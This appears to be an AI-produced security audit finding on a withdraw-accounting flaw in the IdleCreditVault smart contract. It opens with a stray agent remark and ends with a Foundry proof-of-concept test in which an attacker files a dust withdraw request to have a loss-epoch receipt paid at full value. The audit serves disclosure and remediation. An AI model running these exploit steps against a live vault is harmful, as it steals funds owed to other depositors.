Let me confirm details in `collectWithdrawFunds` and how `lossRecoveryPriceByEpoch` is keyed.### Title
Loss-adjusted withdraw receipts escape the haircut and are paid at par after a second withdraw request overwrites `lastWithdrawRequest` - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
When `stopEpochWithDuration` realizes a loss, `collectWithdrawFunds` records a recovery haircut in `lossRecoveryPriceByEpoch[epochNumber]` and zeroes `pendingWithdraws`, but deliberately leaves each user's per-epoch receipt (`withdrawsRequestsByEpoch[user][epoch]` and the aggregate `withdrawsRequests[user]`) in place to be cleared lazily on claim. The claim path looks up the loss epoch through a single mutable key, `lastWithdrawRequest[user]`. If the user files any new `requestWithdraw` in a later epoch before claiming, that key is overwritten, the loss-epoch lookup is skipped, and the still-present stale receipt is paid out at par by the funded-claim path — even though the vault only collected the haircutted amount. The external bug class (a lookup keyed on an unparseable/stale key dying or misbehaving instead of resolving correctly) maps here as a stale mapping key causing the wrong code path to run.

### Finding Description
`collectWithdrawFunds` in `IdleCreditVault` handles partial funding after a realized loss:

```solidity
// IdleCreditVault.sol:414-421
if (_amount < pendingBasis) {
  if (!defaultRecoveryInitialized) revert NotAllowed();
  uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
  if (lossRecoveryPrice == 0) revert NotAllowed();
  pendingWithdraws = 0;
  lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
}
```

Only `epochNumber`-keyed state is written; `withdrawsRequestsByEpoch[user][epoch]` and `withdrawsRequests[user]` are untouched. On claim, `claimWithdrawRequest` tries `_claimLossAdjustedWithdrawRequest` first:

```solidity
// IdleCreditVault.sol:789-799
uint256 lossEpoch = lastWithdrawRequest[_user];
uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
if (lossRecoveryPrice == 0) return amount;
(uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
...
amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
_transferFundedClaim(_user, amount);
```

The loss epoch is resolved exclusively via `lastWithdrawRequest[_user]`. `requestWithdraw` overwrites it on every request (`lastWithdrawRequest[_user] = currentEpoch;`, line 282) while `withdrawsRequests[_user]` and `withdrawsRequestsByEpoch[_user][currentEpoch]` keep accumulating (lines 292-293). So an attacker who holds a receipt in loss epoch E1 files a dust-sized `requestWithdraw` in epoch E2:

- `lastWithdrawRequest[attacker]` becomes E2; `lossRecoveryPriceByEpoch[E2] == 0`, so `_claimLossAdjustedWithdrawRequest` returns 0 and never clears the E1 entry.
- After one more epoch, `_claimFundedWithdrawRequest`'s gate (`epochNumber <= lastWithdrawRequest[_user]`, line 326) passes, and it pays `withdrawsRequests[attacker]` — which still contains the full un-haircutted E1 basis — at par via `_transferFundedClaim`.

The vault only received `_amount = claimBasis * lossRecoveryPrice / RECOVERY_FULL` for those receipts. The `_transferFundedClaim` reserve guard only protects `defaultRecoveryReserve`, not other users' funded claims or strategy liquidity.

### Impact Explanation
Direct theft / insolvency: the attacker redeems the E1 receipt at face value while the vault holds only the haircutted funding for it. The shortfall, quantified as `claimBasis_E1 * (RECOVERY_FULL - lossRecoveryPrice) / RECOVERY_FULL`, is paid from underlyings belonging to other claimants and LPs — the loss that `stopEpochWithDuration` was supposed to socialize is instead transferred to honest users who then cannot be paid in full (the last claimants' `_transferFundedClaim`/`safeTransfer` revert, permanently freezing their funded receipts). Cost to the attacker is one dust withdraw request plus one epoch of waiting.

### Likelihood Explanation
Conditions are fully attacker-controlled and common: any holder of a pending withdraw receipt in an epoch where the borrower underfunds at `stopEpochWithDuration` (i.e., any realized credit loss short of default) can execute it. It requires no privileged role, works in normal and APR0 modes (APR0 principal in `apr0Users` is settled separately, but the normal `withdrawsRequests` path suffices), and no existing guard stops it — `lossRecoveryPriceByEpoch` is only consulted through the overwritten `lastWithdrawRequest` key, and `_clearWithdrawClaimForEpoch` is never invoked for E1.

### Recommendation
Track loss-adjusted exposure per epoch rather than through the single `lastWithdrawRequest` slot: e.g., maintain a per-user set/bitmap of epochs with non-zero `lossRecoveryPriceByEpoch` and non-zero `withdrawsRequestsByEpoch`, or clear `withdrawsRequestsByEpoch`/`withdrawsRequests` for all pending receipts at `collectWithdrawFunds` time and route payouts solely through `lossRecoveryPriceByEpoch`, or have `requestWithdraw` first settle any outstanding loss-adjusted receipt for the user before overwriting `lastWithdrawRequest`.

### Proof of Concept
```solidity
// Foundry fork PoC — assumes standard epoch variant, AA tranche, honest borrower/manager
function testLossReceiptEscapesHaircut() external {
    address alice = makeAddr('alice'); // attacker
    address bob   = makeAddr('bob');   // honest claimaint
    deal(defaultUnderlying, alice, 100_000e6);
    deal(defaultUnderlying, bob,   100_000e6);
    deal(defaultUnderlying, borrower, 1_000_000e6);

    // both deposit AA, epoch starts
    _depositWithUser(alice, 50_000e6, true);
    _depositWithUser(bob,   50_000e6, true);
    _toggleEpoch(true, 0, 0);

    // both request withdraw in epoch N (buffer/running)
    vm.prank(alice); cdoEpoch.requestWithdraw(0, address(AAtranche));
    vm.prank(bob);   cdoEpoch.requestWithdraw(0, address(AAtranche));

    // borrower underfunds: stopEpochWithDuration realizes a loss, e.g. 50% haircut
    vm.warp(cdoEpoch.epochEndDate() + 1);
    uint256 pending = strategy.pendingWithdraws();
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(pending / 2, EPOCH_DURATION); // half funded
    // -> strategy.collectWithdrawFunds(pending/2) sets lossRecoveryPriceByEpoch[N] = 0.5e18

    // attacker files a dust request in epoch N+1, overwriting lastWithdrawRequest
    _depositWithUser(alice, 2e6, true); // needs tranche tokens to request
    vm.prank(alice);
    cdoEpoch.requestWithdraw(0, address(AAtranche)); // lastWithdrawRequest[alice] = N+1

    // let epoch N+1 end fully funded
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    // attacker claims: loss-epoch path sees lossRecoveryPriceByEpoch[N+1]==0 and returns 0;
    // funded path pays full withdrawsRequests[alice] (un-haircutted epoch-N basis) at par.
    uint256 pre = underlying.balanceOf(alice);
    vm.prank(alice);
    cdoEpoch.claimWithdrawRequest();
    uint256 claimed = underlying.balanceOf(alice) - pre;

    // attacker received ~50_000e6 face value for receipts only funded at 50%
    assertGt(claimed, 25_000e6 * 2 - 1); // > funded share for epoch N
    // bob's subsequent claim reverts or is short: vault drained
    vm.expectRevert();
    vm.prank(bob);
    cdoEpoch.claimWithdrawRequest();
}
```